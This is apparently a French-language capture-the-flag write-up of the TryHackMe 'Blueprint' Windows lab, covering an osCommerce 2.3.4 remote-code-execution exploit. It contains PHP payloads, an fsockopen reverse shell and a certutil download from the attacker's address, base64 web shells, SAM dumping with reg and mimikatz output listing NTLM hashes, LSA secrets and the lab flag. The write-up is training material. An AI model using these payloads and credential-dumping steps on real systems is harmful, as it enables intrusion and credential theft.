# Blueprint
> Hack into this Windows machine and escalate your privileges to Administrator.

https://tryhackme.com/room/blueprint

WriteUps:
* https://sckull.github.io/posts/blueprint/

Living Off The Land Binaries and Scripts (and also Libraries)

## Au menu

* Exploitation d'une vulnerabilité RCE php sur un serveur Windows (sans metasploit)
* Découverte des actions possibles (Upload, Exec, Intel, Encodage, ...)
* Etude et Utilisation d'un reverse shell php spécifique à windows (base64, nc, ...)
* Des echecs (nc, meterpreter)

* L'utilisation de binaire "historiques" a des usages autres que ceux a quoi il sont destinés. 
  * Download, Encode, Decode, AWL Bypass (App WhiteListing), Exec, Alternate Data Stream (ADS)
* Le dump de la sam : zero to hero !
  * reg, mimikatz, 

## Découvertes : 

* https://lolbas-project.github.io
* Alternate Data Stream (ADS). 
* AWL Bypass (App WhiteListing)
* Pyhton: l'utilisation des triples double-quotes

+++
## Scan des ports

```sh
nmap -Pn -sC -sV -vv -oN nmap.txt target.thm
```

```sh
80/tcp    open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     syn-ack Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2h PHP/5.6.28)
445/tcp   open  microsoft-ds syn-ack Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        syn-ack MariaDB (unauthorized)
8080/tcp  open  http         syn-ack Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
49152/tcp open  msrpc        syn-ack Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack Microsoft Windows RPC
49159/tcp open  msrpc        syn-ack Microsoft Windows RPC
49160/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Hosts: BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
```


Ok, on a donc a faire à une machine Windows, qui expose 3 serveurs web dont deux instances Apache 2.4.23

La partie "script" de nmap nous donne la version de l'OS `Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)` et son nom "netbios" : `BLUEPRINT`.
On appredns également que la machine n'est pas attachée à un domaine.

```
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-05-19T21:46:04+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

## Windows Enum

Enum4Linux ne donne pas de resultats.

```sh
enum4linux -a target.thm
```

Enum des partages et utilisateurs via nmap (share/users)

```sh
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse target.thm -oN nmap.shares.txt
```

```sh
 smb-enum-shares: 
|   account_used: guest
|   \\10.10.77.134\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.77.134\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.77.134\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ
|     Current user access: READ/WRITE
|   \\10.10.77.134\Users: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|     Current user access: READ
|   \\10.10.77.134\Windows: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ
```

On a accès au share "Users" mais rien d'intéressant la dedans ... peut-être qu'en cherchan bien, on trouverais le flag...

Enum des vulnerabilité connue smb via nmap

```sh
locate *.nse |grep smb*
```

```sh
nmap --script smb* target.thm
```


##


## Test du  port 3306 MySQL

```sh
mysql -h target.thm -u root
ERROR 1130 (HY000): Host 'ip-10-9-11-184.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
```

ça semble une impasse...


## Exploration "web"

Sur le port 80 on a un serveur genre IIS qui crache une erreur 404.
Sur le port 8080 on a un serveur apache qui affiche une arborescence de répertoire, bon signe.
Le port 443 semble être la version https du 8080.


## GoBuster

gobuster dir -u http://target.thm:8080/oscommerce-2.3.4/catalog/ -x php,html,txt,aspx,asp -t 15 -q -w /usr/share/wordlists/dirb/common.txt

http://target.thm:8080/oscommerce-2.3.4/catalog/admin/redirige vers http://localhost:8080/oscommerce-2.3.4/catalog/admin/login.php .. locahost

Plein de touche mais rien qui saute aux yeux.


## osCommerce Online Merchant v2.3.4

On a une veille version de osCommerce.

```sh
kali@kali:~/thm/blueprint$ searchsploit oscommerce 2.3.4
----------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                             |  Path
                                                                                                           | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------- ----------------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities                                                                | exploits/php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection                                                              | exploits/php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection                                                           | exploits/php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                                            | exploits/php/webapps/46330.txt
osCommerce 2.3.4.1 - Arbitrary File Upload                                                                 | exploits/php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution                                                                 | exploits/php/webapps/44374.py
----------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

Pour laquelle on a des exploit, dont une RCE !

https://www.exploit-db.com/exploits/44374

Alors, on peut exploiter cette faille uniquement si le dossier contenant les scripts php d'installation n'ont pas été supprimé. Dans ce cas, il est possible d'appeler directement l'etape 4 du wizzard d'installation qui va générer le fichier de configuration de l'appli ... fichier qui est inclus dans tous les scripts php ! :)

Ca marche comme une injection sql. 


http://target.thm:8080/oscommerce-2.3.4/catalog/install/install.php?step=4

OK, les scripts d'install sont encore la.

Configuration de l'exploit pour notre cible et test du payload de base.

```py
payload += 'system("ls");'    # this is where you enter you PHP payload
```

```sh
kali@kali:~/thm/blueprint$ python exploit.py 
[+] Successfully launched the exploit. Open the following URL to execute your code

http://target.thm:8080/oscommerce-2.3.4/catalog/install/includes/configure.php
```

L'exploit semble avoir fonctionné et nous donne une url.

```
Warning: system() has been disabled for security reasons in C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\configure.php on line 27
```

system(); exec(); passthru(); shell_exec();

Essai avec `shell_exec()`

https://www.php.net/manual/fr/function.shell-exec.php

```php
<?php
$output = shell_exec('ls -lart');
echo "<pre>$output</pre>";
?>
```

```py
payload += '$output=shell_exec("cmd.exe /C whoami");'
payload += 'echo "<pre>$output</pre>";'
```

> nt authority\system

Bingo, on est root avec une RCE, en route vers le Reverse shell.

mais pour ça on va devoir trouver un moyen .... et donc faire des test.


Est-ce qu'on a accès à du powershell ?

```py
payload += """$var=shell_exec("cmd.exe /C powershell -c 'Get-Service'");"""
```

> Maximum execution time of 30 seconds exceeded in !!!

```py
payload += """$var=shell_exec("cmd.exe /C powershell -c '$PSVersionTable.PSVersion'");"""
```

> Undefined variable: PSVersionTable

Bon ça semble être une veille version de Powershell, genre 1.0.



Allons faire un tour sur google...

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```py
payload += '$sock=fsockopen("10.9.11.184",4242);exec("cmd.exe -i <&3 >&3 2>&3");'
```

```sh
kali@kali:~/thm/blueprint$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.9.11.184] from (UNKNOWN) [10.10.0.174] 49438
```

On a une connection qui ferme direct...

Plan B, il faut qu'on envoi un reverse shell php sur le serveur.

Test d'ecriture de fichier via l'exploit.

```py
payload += """$file = fopen('phpinfo.php', 'wb');fwrite($file, '<?php phpinfo() ?>');fclose($file);"""
```

http://target.thm:8080/oscommerce-2.3.4/catalog/install/includes/phpinfo.php

Ca marche !

Du coup on en apprend un peu plus sur la machine.

PHP Version 5.6.28
C:\xampp\php\php.ini 

PATH 	C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\; 
COMSPEC 	C:\Windows\system32\cmd.exe 
DOCUMENT_ROOT 	C:/xampp/htdocs 
SCRIPT_FILENAME 	C:/xampp/htdocs/oscommerce-2.3.4/catalog/install/includes/phpinfo.php 

mysqlnd 5.0.11-dev - 20120503 - $Id: 76b08b24596e12d4553bd41fc93cccd5bac2fe7a $ 



Ok, bon si on veut envoyer un fichier binaire et/ou php complexe, il faut encode en base 64.

kali@kali:~/thm/blueprint$ echo "<?php phpinfo() ?>" | base64
PD9waHAgcGhwaW5mbygpID8+Cg==

https://www.base64decode.net/php-base64-decode


```py
payload += """$file = fopen('phpinfo.php', 'wb');fwrite($file, base64_decode('PD9waHAgcGhwaW5mbygpID8+Cg=='));fclose($file);"""
```

OK, on peut envoyer un fichier encodé en base64


https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/


<?php system($_GET['cmd']);?>

<?php $output=shell_exec("cmd.exe /C '".$_GET['cmd']."'"); echo "<pre>$var</pre>"; ?>
PD9waHAgJG91dHB1dD1zaGVsbF9leGVjKCJjbWQuZXhlIC9DICciLiRfR0VUWydjbWQnXS4iJyIp
OyBlY2hvICI8cHJlPiR2YXI8L3ByZT4iOyA/Pg==

<?php echo "<pre>$_GET['cmd']</pre>"; ?>
PD9waHAgZWNobyAiPHByZT4kX0dFVFsnY21kJ108L3ByZT4iOyA/Pgo=

FAILED

kali@kali:~/thm/blueprint$ cat payload.php | base64

```py
payload += """$file = fopen('phpinfo.php', 'wb');fwrite($file, base64_decode('PD9waHAgJG91dHB1dD1zaGVsbF9leGVjKCJjbWQuZXhlIC9DICciLiRfR0VUWydjbWQnXS4iJyIp
OyBlY2hvICI8cHJlPiR2YXI8L3ByZT4iOyA/Pg=='));fclose($file);"""
```


Google : https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php

Adaptation du script > Base 64 > payload

Bon c'est une grosse chaine ...

Mise à dispo via un serveur web + téléchargement

Quel est l'equivalent de wget sous windows ? > 

https://lolbas-project.github.io/lolbas/Binaries/Certutil/#download


```py
payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.9.11.184/payload.php exploit.php");'
payload += 'echo $var;'
```

```sh
kali@kali:~/thm/blueprint$ up 80
ip: 10.9.11.184/16
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.5.66 - - [20/May/2020 17:35:56] "GET /payload.php HTTP/1.1" 200 -
10.10.5.66 - - [20/May/2020 17:36:02] "GET /payload.php HTTP/1.1" 200 -
```

ça marche !

Démarrage de Netcat

http://target.thm:8080/oscommerce-2.3.4/catalog/install/includes/exploit.php


Bingo, on a un shell !


Test de revershell avec metasploit + meterpreter


msf5> use exploit/multi/handler
msf5> set payload windows/shell/reverse_tcp
msf5> set lhost tun0
msf5> set lport 4242
msf5> run

Try #1: FAILED

Try #2: sessions OK, upgrade to meterpreter : FAILED

OK, donc pas de meterpreter, a l'ancienne !

### poorman hashdump

https://superuser.com/questions/364290/how-to-dump-the-windows-sam-file-while-the-system-is-running

Utilisation de la commande systeme `reg` pour dumper la base de registre.

reg save hklm\sam C:\xampp\htdocs\sam.dmp
reg save hklm\system C:\xampp\htdocs\system.dmp

```ps1
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\Temp>reg save hklm\sam C:\xampp\htdocs\sam.dmp
reg save hklm\sam C:\xampp\htdocs\sam.dmp
The operation completed successfully.

C:\Windows\Temp>reg save hklm\system C:\xampp\htdocs\system.dmp
reg save hklm\system C:\xampp\htdocs\system.dmp
The operation completed successfully.

C:\Windows\Temp>
```

Extraction des hash

```sh
kali@kali:~/thm/blueprint$ samdump2 system.dmp sam.dmp 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

Et le flag ?

```ps1
Directory of C:\Users\Administrator\Desktop

11/27/2019  07:15 PM    <DIR>          .
11/27/2019  07:15 PM    <DIR>          ..
11/27/2019  07:15 PM                37 root.txt.txt
               1 File(s)             37 bytes
               2 Dir(s)  19,304,919,040 bytes free

C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

##  Crack the hash

https://crackstation.net/

=> googleplus



# Alternatives



### mimikatz

https://github.com/gentilkiwi/mimikatz

Upload de mimikatz sur le serveur

http://localhost/Win32/mimikatz.exe

Commencez par exécuter la commande suivante :

mimikatz # privilege::debug

La sortie vous indique si vous disposez des droits requis pour continuer.

Ensuite, lancez les fonctions de journalisation afin de pouvoir vous référer par la suite à ce que vous avez fait.

mimikatz # log mimi.log

Enfin, sortez tous les mots de passe en texte clair conservés sur cet ordinateur.

mimikatz # sekurlsa::logonpasswords

mimikatz # lsadump::sam
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : 3700ddba8f7165462130a4441ef47500

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 549a1bcb88e35dc18c7a0b0168631411

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: 30e87bf999828446a1c1209ddde4c450

mimikatz # lsadump::secrets
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f

Local name : BLUEPRINT ( S-1-5-21-3130159037-241736515-3168549210 )
Domain name : WORKGROUP

Policy subsystem is : 1.11
LSA Key(s) : 1, default {5a999efc-4a4d-decc-fd1d-b1680771d57f}
  [00] {5a999efc-4a4d-decc-fd1d-b1680771d57f} d2fb4bc35f775701ba85064053ac995d5adafee06b8c9fa2b14d5667f498f121

Secret  : DefaultPassword
cur/text: malware
old/text: ROOT#123

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 9b d2 f1 7b 53 8d a4 07 6b f2 ec ff 91 dd df a9 35 98 c2 80 25 1d e6 77 56 4f 95 0b b6 43 b8 d7 fd fa fe c7 84 a7 30 d1 
    full: 9bd2f17b538da4076bf2ecff91dddfa93598c280251de677564f950bb643b8d7fdfafec784a730d1
    m/u : 9bd2f17b538da4076bf2ecff91dddfa93598c280 / 251de677564f950bb643b8d7fdfafec784a730d1
old/hex : 01 00 00 00 e5 73 9c b0 a3 cd 14 2c cb 8d ab bb fa dd ab 50 e6 2e d3 81 69 aa b3 a2 b0 2d 50 4b 5f aa 80 18 3c 89 e5 92 e1 eb a7 44 
    full: e5739cb0a3cd142ccb8dabbbfaddab50e62ed38169aab3a2b02d504b5faa80183c89e592e1eba744
    m/u : e5739cb0a3cd142ccb8dabbbfaddab50e62ed381 / 69aab3a2b02d504b5faa80183c89e592e1eba744



Directory of C:\Users\Administrator\Desktop

11/27/2019  07:15 PM    <DIR>          .
11/27/2019  07:15 PM    <DIR>          ..
11/27/2019  07:15 PM                37 root.txt.txt
               1 File(s)             37 bytes
               2 Dir(s)  19,304,919,040 bytes free

C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}



##  Crack the hash

https://crackstation.net/

=> googleplus


sudo john -mask=?l?l?l?l?l?l?d?d --format=NT lab.john



## GoBuster

Accès mode web : http://target.thm/

une page d'erreur ....

Le serveur web qui ecoute sur le port 443 n'est pas IIS mais Apache ...

https://target.thm/

Arret de gobuster sur le port 80, bascule sur le port 443.



gobuster dir -u http://blueprint.thm:8080/oscommerce-2.3.4/catalog/ -x php,html,txt,aspx,asp -t 15 -q -w /usr/share/wordlists/dirb/common.txt sera




